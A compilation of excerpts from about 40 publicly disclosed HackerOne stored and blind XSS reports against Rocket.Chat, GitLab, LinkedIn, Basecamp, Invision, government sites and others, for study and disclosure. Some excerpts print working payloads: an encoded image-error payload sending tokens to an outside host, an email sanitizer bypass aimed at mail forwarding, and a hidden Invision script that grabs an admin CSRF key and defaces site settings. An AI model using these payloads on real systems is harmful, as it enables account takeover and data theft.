# HackerOne 实战案例：cross-site-scripting-xss-stored

_40 份已披露报告（High/Critical 优先），来源 HackerOne 公开披露_

## XSS via /api/v1/chat.postMessage
- 等级：Critical | 项目：Rocket.Chat | 披露：2024-08-10 | CVE：-
- 原文：https://hackerone.com/reports/219957

- - - - - - - - 
> NOTE! Thanks for submitting a report! Please replace *all* the [square] sections below with the pertinent details. Remember, the more detail you provide, the easier it is for us to verify and then potentially issue a bounty, so be sure to take your time filling out the report!
**Summary:** An attacker can craft a custom message using the REST API that, once seen by the observer, executes arbitrary code in the context of the client user.
**Description:** According to the API documentation chat messages can have attachments. These attachments then can have fields which contain a title and subtitle for the attachment. When the attachment has an `image_url` assigned, the first


## Stored XSS on LinkedIn App via iframe tag in Article
- 等级：Critical | 项目：LinkedIn | 披露：2024-02-28 | CVE：-
- 原文：https://hackerone.com/reports/2212950

- - - - - - - - 
A stored XSS  issue was reported on “LinkedIn Article” where a malicious JavaScript (JS) payload can be embedded in URL field of iframe. When such article gets published, and accessed on LinkedIn Mobile App, the malicious JS would get executed in victim’s context.  Upon receiving this report, we resolved it on a priority basis and paid the researcher a bounty.
**Summary (researcher):**
sog
---


## Cross-site scripting on dashboard2.omise.co
- 等级：Critical | 项目：Omise | 披露：2022-05-24 | CVE：-
- 原文：https://hackerone.com/reports/1532858

- - - - - - - - 
## Summary:
Cross-site scripting (XSS) is an attack vector that injects malicious code into a vulnerable web application.
Stored XSS, also known as persistent XSS, is the more damaging of the two. It occurs when a malicious script is injected directly into a vulnerable web application.
Steps To Reproduce:
1. Log in to your account.
2. Visit https://dashboard.omise.co/test/settings 
3. Under Export - Specify the metadata that you want to include in your export option. Enter <script>alert(2)</script> in all four parameters including Charge, Transfer, Refund, Dispute.
4. Click on Update settings.
5. Click on Try our new dashboard, XSS will Trigger or log out and log in again, a


## Blind XSS on Twitter's internal Jira panel at ████ allows exfiltration of hackers reports and other sensitive data
- 等级：Critical | 项目：X | 披露：2022-02-12 | CVE：-
- 原文：https://hackerone.com/reports/1369674

- - - - - - - - 
The researcher demonstrated a vulnerability in Twitter's Jira instance where user supplied information was handled in an improper manner, rendering the application vulnerable to blind XSS. By crafting a bug report and sending it to Twitter it was possible to locate this proof of concept code within Twitter's Jira instance, such that upon viewing by an employee the researcher's proof of concept code would execute. This vulnerability allowed the researcher to obtain information about internal reports stored within Twitter's internal Jira instance.
---


## Stored XSS in markdown via the DesignReferenceFilter
- 等级：Critical | 项目：GitLab | 披露：2021-10-18 | CVE：-
- 原文：https://hackerone.com/reports/1212067

- - - - - - - -


## Blind XSS on Twitter's internal Big Data panel at █████████████
- 等级：Critical | 项目：X | 披露：2021-07-09 | CVE：-
- 原文：https://hackerone.com/reports/1207040

- - - - - - - - 
An attacker appears to be able to send an XSS payload to Twitter staff members, using a Support Form. This XSS payload will execute in the context of an internal subdomain, allowing it to exfiltrate sensitive internal Twitter information.
---


## Account takeover via XSS
- 等级：Critical | 项目：Rocket.Chat | 披露：2021-03-31 | CVE：-
- 原文：https://hackerone.com/reports/735638

- - - - - - - - 
**Summary:** By combining AutoLinker and Markdown an attacker is able to inject malicious scripts.
**Description:** By combining AutoLinker and Markdown we can trick the parser into breaking out of the current HTML attribute. 
[code omitted]
results in:
[code omitted]
To obtain the login-token of the victim we can either use `document.cookie` or `localStorage.getItem('Meteor.loginToken')`.
Since we can authenticate against the websocket using this token, we can perform any actions in the context of the victim (change password, email etc.).
## Releases Affected:
  * Rocket.Chat-Desktop-Client: v2.16.2
  * Rocket.Chat-Server: v2.0.0
  * Apps-Engine-Version: v1.5.2
## Steps To 


## Blind Stored XSS Payload fired at the backend on https://█████████/
- 等级：Critical | 项目：U.S. | 披露：2021-03-24 | CVE：-
- 原文：https://hackerone.com/reports/1051369

- - - - - - - - 
**Summary:**
I have just gotten an email notification from my XSSHunter payload that my blind stored XSS has been triggered by an administrator on the █████████ site, in the following URL:
[code omitted]
Admin IP address: 
████████
User-Agent:
█████████
Cookies:
[code omitted]
Injection Image:
███████
DB Creds exposed:
██████████.█████\█████a
## Suggested Mitigation/Remediation Actions
Sanitizing the input on the back-end as well
##Best Regards
nagli
## Impact
Ability to capture administrator action when preforming activities on the back-end.
Extractions of DB credentials.
Access to private information.
Stealing the cookies of the administrator.
---


## Blind Stored XSS on ███████  leads to takeover admin account
- 等级：Critical | 项目：U.S. | 披露：2021-03-11 | CVE：-
- 原文：https://hackerone.com/reports/1110243

- - - - - - - - 
##Hello Team,
I am Hemant Patidar working as a security researcher and I found a bug in your site.
Report of bug is as follows:-
##Vulnerable URL:
https://████████/
##Description:
I have found that various field of the profile page is not properly configured to wipe out HTML tags and Javascript code which leads to store the blind XSS payload in the first name, last name, title etc. and whenever the admin will check the profile the code will fire and we will get response in the XSS Hunter along with the screenshot of the admin side, IP and cookies and other sensitive information.
POC: 
XSS Hunter report attached.
## Impact
An attacker is able to access critical information fr


## XSS in message attachment fileds.
- 等级：Critical | 项目：Rocket.Chat | 披露：2021-01-17 | CVE：CVE-2020-8288
- 原文：https://hackerone.com/reports/899954

- - - - - - - - 
> NOTE! Thanks for submitting a report! Please replace *all* the [square] sections below with the pertinent details. Remember, the more detail you provide, the easier it is for us to verify and then potentially issue a bounty, so be sure to take your time filling out the report!
**Summary:** There is a Cross-Site Scripting vulnerability in the message attachment fields.
**Description:**
If no custom renderer is set, the `specializedRendering` function will render any HTML provided in the `value` field of the attachment:
[code omitted]
## Releases Affected:
  * Rocket.Chat up to 3.3.3
## Steps To Reproduce (from initial installation to vulnerability):
1. Get an Personal Acces


## Blind XSS on image upload
- 等级：Critical | 项目：CS | 披露：2020-12-26 | CVE：-
- 原文：https://hackerone.com/reports/1010466

- - - - - - - - 
## Summary:
- The CSRF vulnerability make a request for support.cs.money/upload_file; This upload_file does not have csrf token/ origin/ reference verification!
- The XSS allows to execute JS. The payload of the XSS stay in the param 'filename' of the CSRF request. 
## Steps To Reproduce:
XSS
- use a proxy like burp suite and turn intercept on
- upload a file to the support chat
- change the filename to \"><img src=1 onerror=\"url=String['fromCharCode'](104,116,116,112,115,58,47,47,103,97,116,111,108,111,117,99,111,46,48,48,48,119,101,98,104,111,115,116,97,112,112,46,99,111,109,47,99,115,109,111,110,101,121,47,105,110,100,101,120,46,112,104,112,63,116,111,107,101,110,115,61)


## HEY.com email stored XSS
- 等级：Critical | 项目：Basecamp | 披露：2020-10-27 | CVE：-
- 原文：https://hackerone.com/reports/982291

- - - - - - - - 
An attacker can bypass the HEY.com HTML sanitizer and inject arbitrary unsafe HTML in emails.
To reproduce the bug you have to send raw HTML-formatted email. You can do it e.g. with the Sendmail tool on Linux.
Example email:
~~~~ plain
From: jouko@klikki.fi
To: jouko@hey.com
Subject: HackerOne test
MIME-Version: 1.0
Content-type: text/html
<style>
url(cid://\00003c\000027message-content\00003e\00003ctemplate\00003e\00003cstyle\00003exxx);
url(cid://\00003c/style\00003e\00003c/template\00003e\00003c/message-content\00003e\00003cform\000020action=/my/accounts/266986/forwardings/outbounds\000020data-controller=beacon\00003e\00003cinput\000020type=text\000020name=contact_outboun


## Multiple XSS on account settings that can hijack any users in the company.
- 等级：Critical | 项目：X | 披露：2019-04-01 | CVE：-
- 原文：https://hackerone.com/reports/503298

- - - - - - - -


## Stored XSS in Private Message component (BuddyPress)
- 等级：Critical | 项目：WordPress | 披露：2019-03-08 | CVE：-
- 原文：https://hackerone.com/reports/487081

- - - - - - - - 
## Description:
WordPress version: **5.0.3**
BuddyPress version: **4.1.0**
Users with accounts can send private messages containing rendered HTML to other uses, this includes being able to execute javascript code via elements such as scripts, iframe etc. The XSS is stored in the database and is triggered any time a user reads the message. This includes the message preview window which shows the last message the user has received (or sent).
The code which runs can be exploited to perform any action that the "Victim" has permissions for, this is especially dangerous for privileged users such as administrators since it allows access to the WordPress settings and private informa


## XSS in steam react chat client
- 等级：Critical | 项目：Valve | 披露：2019-01-07 | CVE：-
- 原文：https://hackerone.com/reports/409850

- - - - - - - - 
The Steam chat client both sends and receives bbcode format chat messages. These map to HTML elements, and notably the [url] bbcode tag is supported for arbitrary URLs. React has strong XSS mitigations but does not mitigate `javascript:` URI based XSS.
This is rather difficult to exploit as the client transmits sanitised messages and receives over a binary WebSocket. I've attached a video of executing this XSS, which is persistent.
## Impact
I strongly believe an attacker could get remote code execution in Steam via this method. The Steam chat client uses the same codebase as the steam web chat client, and, I imagine does so using electron or some other webview system. These


## XSS-уязвимость, связанная с загрузкой файлов
- 等级：Critical | 项目：VK.com | 披露：2018-08-02 | CVE：-
- 原文：https://hackerone.com/reports/375886

- - - - - - - - 
XSS в документах.
---


## Очень жесткая XSS в личных сообщениях m.ok.ru
- 等级：Critical | 项目：ok.ru | 披露：2018-06-30 | CVE：-
- 原文：https://hackerone.com/reports/302253

- - - - - - - - 
Приветствую.
Нашел багу в личных сообщениях в мобильной версии
{F251208}
Что нужно, чтоб заюзать:
1. Переходим в группу https://m.ok.ru/group/54904397693159/market
2. Ищем товар единственный на страничке
{F251213}
3. Переходим на него и нажимаем на кнопку "Связаться с продавцом" (https://m.ok.ru/group/54904397693159/market)
{F251215}
4. Видим алерт.
{F251216}
Нет фильтрации служебных символов тут -
<div class="discus_dialogs_topic emphased tx-ellip">"&gt;<img src="x" onerror="alert()"></div>
## Impact
XSS.
---


## новенькое (старенькое upgreid) хакерство: делаем демократию во всем в контакте (XSS - на англиском)
- 等级：Critical | 项目：VK.com | 披露：2018-03-04 | CVE：-
- 原文：https://hackerone.com/reports/316946

- - - - - - - - 
XSS в Wiki.
**Summary (researcher):**
ето жесткое хакерство позволяло устроить массовую глючность в social set’ V Kontakte и зделать репост от имени любого челика открывшего сылку (особено страшно в росии где сажают за репосты) в контакти все оперативно исправили (3 месяца) у них реяльно золотые руки к сожелению глючность попала в руки очень плохих злых хакеров которые устроили незаконую агитацию кое какого персонажа (и испортили ему ужин - он чуть не подавился пельменями от ржаки) розроботчики сразу наказали злово хакера (бан страници) поетому в контакти была и остаеться самой безопасной social сетью регестрируйтесь [https://vk.com](https://facebook.com)
моя страница социал


## Report Design Critical Stored DOM XSS Vulnerability
- 等级：Critical | 项目：Infogram | 披露：2017-12-08 | CVE：-
- 原文：https://hackerone.com/reports/282909

- - - - - - - - 
Hi Team,
Another XSS vulnerability in report designer but this one is critical. 
**Problem Point**
Report's Overview Table
**Report Creation Url**
https://infogram.com/app/#edit/e7b161f1-f708-48e5-bab7-de9887ae202a
**Sample Data**
<a href="" onmouseover="javascript:alert('HackerOne MkSecurity Dom XSS');">Click for Detail</a>
**Sample URL** 
https://infogram.com/report-classic-1g57pr0g3xdvp01
---


## Stored XSS in Conversion Statistics via Tracker Name
- 等级：High | 项目：Revive | 披露：2025-11-19 | CVE：CVE-2025-52668
- 原文：https://hackerone.com/reports/3400506

- - - - - - - - 
I found stored XSS on the conversion statistics page. Advertisers can inject malicious JavaScript through tracker names, which executes when admins view conversion reports (`www/admin/stats-conversions.php:356`). I was able to steal admin session cookies using this vulnerability. This is a privilege escalation problem: low-privilege advertiser accounts can compromise high-privilege admin accounts.
--
---
## Affected System
- **Product:** Revive Adserver
- **Version Tested:** 6.0.1
- **Component:** Statistics / Conversion Reports
- **File:** `www/admin/stats-conversions.php:356`
- **URL:** `http://[host]/www/admin/stats-conversions.php?clientid=[id]`
---
## Vulnerable Code
[c


## Stored XSS via LINK Name.
- 等级：High | 项目：Insightly | 披露：2025-09-23 | CVE：-
- 原文：https://hackerone.com/reports/1392262

- - - - - - - - 
## Summary:
Hi Team,
The `LINK NAME` is not properly escaped at the `Templates` page leading to `Stored XSS` and the name is reflected in the `<script> tag` , due to lack of sanitization the user can break out of the <script> tag and execute the XSS.
See Proof Of Concept below.
Thank You.
---
## Steps To Reproduce:
A. Log into your account at `https://marketing.na1.insightly.com/`
B. Click on `Plus Sign` --> `Add a new redirect Link` 
C. Enter this `'"></script><img src=x onerror=alert(1)>{{'7'*7}}` payload in the `Link Name` and fill all other details.
D. Click on `Save` and click on `Emails Icon` --> `Email Templates` --> `New Email Templates`
E. Enter all the details and 


## Stored XSS in AREA tutorials
- 等级：High | 项目：Autodesk | 披露：2025-08-25 | CVE：-
- 原文：https://hackerone.com/reports/3008066

- - - - - - - - 
A stored cross-site scripting (XSS) vulnerability was found on AREA, which could have allowed an attacker to inject malicious JavaScript code when publishing a tutorial. Autodesk has fixed the vulnerability and we thank @who_am_i_ for reporting this issue.
---


## Stored XSS in File Upload Leads to Privilege Escalation and Full Workspace Takeover
- 等级：High | 项目：Dust | 披露：2025-05-02 | CVE：-
- 原文：https://hackerone.com/reports/3115705

- - - - - - - - 
## Summary:
A stored cross-site scripting (XSS) vulnerability was discovered in the Dust platform’s file upload functionality.
An attacker can upload a malicious HTML file to a conversation. When another user, including an admin, visits the uploaded file, JavaScript is executed in their authenticated browser session.
This allows an attacker to issue authenticated API requests on behalf of the victim, including:
	•	Promoting their own account to Admin
	•	Downgrading or removing legitimate admins
	•	Accessing and deleting secrets
	•	Full control over the workspace
The attack requires the victim to be a member of the same workspace and visit the malicious file URL. Once trigger


## Stored Cross-Site Scripting in mercadopago.com.ar
- 等级：High | 项目：MercadoLibre | 披露：2025-03-13 | CVE：-
- 原文：https://hackerone.com/reports/1955485

- - - - - - - - 
We thank @elmago and @n1ko for the report and for providing clear reproduction steps with a proof-of-concept code demonstrating the vulnerability. MercadoLibre acknowledged the issue and worked on a fix internally.
---


## Stored XSS via Post Tittle Enabling Non-Privileged User to Privileged User Exploitation on https://forums.autodesk.com/
- 等级：High | 项目：Autodesk | 披露：2025-02-26 | CVE：-
- 原文：https://hackerone.com/reports/2974307

- - - - - - - - 
A stored cross-site scripting (XSS) vulnerability was found on Autodesk Forums, which could have allowed an attacker to inject malicious JavaScript code when viewed by both non-privileged and privileged users. Autodesk has fixed the vulnerability and we thank @the-white-evil for reporting this issue.
---


## Stored XSS on trix editor version 2.1.1
- 等级：High | 项目：Basecamp | 披露：2024-11-04 | CVE：CVE-2024-34341
- 原文：https://hackerone.com/reports/2521419

- - - - - - - - 
The Trix editor  is vulnerable to arbitrary code execution when copying and pasting content from the web or other documents with markup into the editor. The vulnerability stems from improper sanitization of pasted content, allowing an attacker to embed malicious scripts which are executed within the context of the application.


## Blind XSS on admin.acronis.com via delete account form on account.acronis.com
- 等级：High | 项目：Acronis | 披露：2024-10-30 | CVE：-
- 原文：https://hackerone.com/reports/666040

- - - - - - - - 
Blind XSS was possible on admin.acronis.com. In order to exploit this it was required to send payload during account deletion process on account.acronis.com.
---


## Stored Xss On "https://www.question.com/"
- 等级：High | 项目：Drugs.com | 披露：2024-09-20 | CVE：-
- 原文：https://hackerone.com/reports/1901706

- - - - - - - - 
Hi Team I'm Find the Stored Xss On your Site
Stored XSS, also known as persistent XSS, is the more damaging than non-persistent XSS. It occurs when a malicious script is injected directly into a vulnerable web application.
Steps To Reproduce:
1.  Go To Your Site https://www.question.com/
2. Nave https://www.question.com/ask/
5. Ask a Question Enter the Payload [code omitted]
3.  Click to Sumit Question & Redirect to https://www.question.com/iframe-onload-alert-9-1631390.html
4. XSS was Tigred you See the Popup
POC
████
Tested on Firefox and chrome.
## Impact
The attacker can steal data from whoever checks the report.
**Summary (researcher):**
POC Video :- https://youtu.be/HL


## Stored XSS in reclamos
- 等级：High | 项目：MercadoLibre | 披露：2024-09-09 | CVE：-
- 原文：https://hackerone.com/reports/1675516

- - - - - - - - 
We thank @valent1ne for the report and for providing clear reproduction steps with a proof-of-concept code demonstrating the vulnerability. MercadoLibre acknowledged the issue and worked on a fix internally.
**Summary (researcher):**
The general messaging functionality of www.mercadolibre.com.ar implemented an HTML sanitizer that allowed the use of a limited set of HTML tags while preventing XSS. While analyzing the functionality, @valent1ne discovered that sending multiple unclosed <p> tags (<p><p><p><p><p><p><p><p>) and appending an extra tag seemed to confuse the sanitizer parser, resulting in unexpected behavior.
This behavior allowed incluiding an extra arbitrary tag, b


## Blind Stored XSS on the internal host - █████████████
- 等级：High | 项目：U.S. | 披露：2024-08-16 | CVE：-
- 原文：https://hackerone.com/reports/923912

- - - - - - - - 
##Description
Hello. I often use mine `xp.ht` host as a beacon for SSRF/XSS payloads, and today one was triggered from the `https://███████████████/NSSI/controlcenterV2/index.htm?directlink&courses/classes/findstudent&&&&&&&&` endpoint (it was found in the Referer header)
This domain isn't resolvable from outside, so I assume the request came from host in the internal network, connected to extranet.
##POC
███████
Sadly, I'm not sure where is exactly the entry point was for the payload - only the vulnerable URL where it triggered the pingback to my host.
The `GET /?_=1594756841631` indicated that payload is likely reside in HTML source, and was triggered during student lookup


## XSS in various MessageTypes
- 等级：High | 项目：Rocket.Chat | 披露：2024-08-10 | CVE：-
- 原文：https://hackerone.com/reports/1379400

- - - - - - - - 
## Summary
Rendering messages of various MessageTypes can lead to arbitrary script execution in the receiving frontend client.
## Description
Messages in Rocket.Chat can have various types that influence the rendering as seen in [app/ui-message/client/message.js#L24-L53](https://github.com/RocketChat/Rocket.Chat/blob/45a5d1f869e1a0ba292d0af2c2a58dcdc8761e13/app/ui-message/client/message.js#L24-L53):
[code omitted]
These MessageTypes are registered on startup of Rocket.Chat, like in this example the Message Snippeting Feature [app/message-snippet/client/messageType.js#L4-L16](https://github.com/RocketChat/Rocket.Chat/blob/45a5d1f869e1a0ba292d0af2c2a58dcdc8761e13/app/message-s


## Multiple XSS and open HTTP redirection
- 等级：High | 项目：ExpressionEngine | 披露：2024-07-16 | CVE：-
- 原文：https://hackerone.com/reports/2372332

- - - - - - - - 
ExpressionEngine was affected by multiple cross-site scripting vulnerabilities that could allow an attacker to execute JavaScript in the browsers of targeted users.
---


## Stored-XSS injected in Wiki page via Banzai pipeline
- 等级：High | 项目：GitLab | 披露：2024-05-28 | CVE：-
- 原文：https://hackerone.com/reports/2257080

- - - - - - - - 
Hello,
I found a vulnerability in [AbstractReferenceFilter](https://gitlab.com/gitlab-org/gitlab/blob/4c3239a8b20a104a15e067f208f269f65dbee927/lib/banzai/filter/references/abstract_reference_filter.rb) class that can be exploited to inject any HTML elements leading to stored-XSS.
# Reproduce
- Create a new project.
- Got to its `Wikis`, `Create your first page` button, then fill the form:
   + Title: `_sidear`
   + Content: please see in `_sidebar.md` attached file ({F2868304})
{F2868305}
   + click `Create page` to save the wiki page
   + after the page is reloaded, you should see an alert which is caused by `alert(document.domain)`
   + **Note:** you will not see the alert


## Client Side Template Injection to Stored XSS in Image Collection
- 等级：High | 项目：Mars | 披露：2024-02-14 | CVE：-
- 原文：https://hackerone.com/reports/2234564

- - - - - - - - 
Client-side template injection vulnerabilities arise when applications using a client-side template framework dynamically embed user input in web pages. When rendering a page, the framework scans it for template expressions and executes any that it encounters. An attacker can exploit this by supplying a malicious template expression that launches a cross-site scripting (XSS) attack. Attacker can steal victim session cookies and takeover their account.
---


## Stored xss at https://█.8x8.com/api/█/ID
- 等级：High | 项目：8x8 | 披露：2023-10-30 | CVE：-
- 原文：https://hackerone.com/reports/2078490

- - - - - - - - 
## Summary:
hey , 
i found a stored  xss at `https://██████.8x8.com/api/██████mentInfoById/ID` , when i analysis javascript code i understand user can modify her ip address with endpoint `https://███.8x8.com/api/patchPaymentMethod/ID` , next point i understand when we open    `https://████████.8x8.com/api/██████████mentInfoById/ID` server set `Content-Type: text/html;charset=UTF-8` , this was interesting point , then i modify ip address with this request:
[code omitted]
now i get response : 
[code omitted]
then i check url : https://█████████.8x8.com/api/██████████mentInfoById/████ 
and i seen ip address updated and █████load successfully executed : 
█████████
  
## Steps To


## XSS with Visual Language Editor tags
- 等级：High | 项目：Invision | 披露：2023-09-17 | CVE：-
- 原文：https://hackerone.com/reports/2031855

- - - - - - - - 
1. Create a post/comment/signature/etc. with the following text: `#VLE#nothing#[<script>ips.getAjax()(ips.getSetting('baseURL') + 'admin/index.php?app=core&module=system&controller=login&do=getCsrfKey').done(({key}) => ips.getAjax()(ips.getSetting('baseURL') + 'admin/index.php?app=core&module=settings&controller=general', {'bypassRedirect':true, 'method': 'POST', 'data': {'csrfKey': key, 'site_online_checkbox':1, 'board_name': 'You have been hacked', 'form_submitted': 1}}))</script>]#!##`.
2. Using e.g. the browser's Inspect Element feature, you can surround the text in editor with `<span style='font-size: 0px;'>` and `</span>` to make it invisible for humans.
3. Once the co


## MetaMask Browser URL and Transaction Origin Spoofing - Metamask wallet Android & Metamask wallet iOS
- 等级：High | 项目：MetaMask | 披露：2023-07-04 | CVE：-
- 原文：https://hackerone.com/reports/1751333

- - - - - - - - 
@renekroka and @hackerontwowheels from the talented team at [UGWST](https://ugwst.com/) discovered a bug that prevented the MetaMask Mobile browser from correctly updating the domain of the browser tab after a redirect.
By exploiting this bug, the duo demonstrated that if a user was redirected from a trusted dApp to a malicious one, any transactions requested by the malicious dApp would appear to have originated from the trusted source. Note that for the malicious dApp to have permissions to request transactions, the wallet owner would have had to explicitly confirm they would like to connect their wallet to it.
Our team worked swiftly to work on a fix that was rolled out to


## Universal XSS with Playlist feature
- 等级：High | 项目：Brave | 披露：2023-06-22 | CVE：-
- 原文：https://hackerone.com/reports/1436558

- - - - - - - - 
## Summary:
Brave iOS has three weaknesses described below. By combining them, Universal XSS can be achieved.
1. Exposure of UserScriptManager.securityToken
[Playlist.js](https://github.com/brave/brave-ios/blob/fdff99ca3997816322015fe5efcd63490193b88d/Client/Frontend/UserContent/UserScripts/Playlist.js#L353) embeds the exact value of the `$<notifyNode>` into `HTMLVideoElement.prototype.setAttribute`. By reading the value, an attacker can retrieve the hidden security token.
2. Exposure of UserScriptManager.messageHandlerToken
Also, [WindowRenderHelper.js](https://github.com/brave/brave-ios/blob/83eb41ac922d7bd18fd311e0a4279e02cdd8e190/Client/Frontend/UserContent/UserScripts/W


## Stored XSS via Kroki diagram
- 等级：High | 项目：GitLab | 披露：2023-06-02 | CVE：-
- 原文：https://hackerone.com/reports/1731349

- - - - - - - -


## Stored XSS in merge request pages
- 等级：High | 项目：GitLab | 披露：2023-05-30 | CVE：-
- 原文：https://hackerone.com/reports/723307

- - - - - - - - 
Hello Gitlab!
[Vulnerable code](https://gitlab.com/gitlab-org/gitlab/blob/9d81e97d9d111f874799605ce50ae480ae15b0c5/app/assets/javascripts/vue_merge_request_widget/components/states/mr_widget_rebase.vue#L47)
To reproduce the bug, we need to open a merge request with the following conditions:
1. Project must have 'Merge commit with semi-linear history' or 'Fast-forward merge' merge method
2. The merge request must require rebase before fast-forward/merge
3. A visitor of the merge request page must not have permissions to push to source branch
4. Target branch name must have a special name `<img/src='x'/onerror=alert(document.domain)>` :) 
**Steps to reproduce:**
1. Run Gitlab 

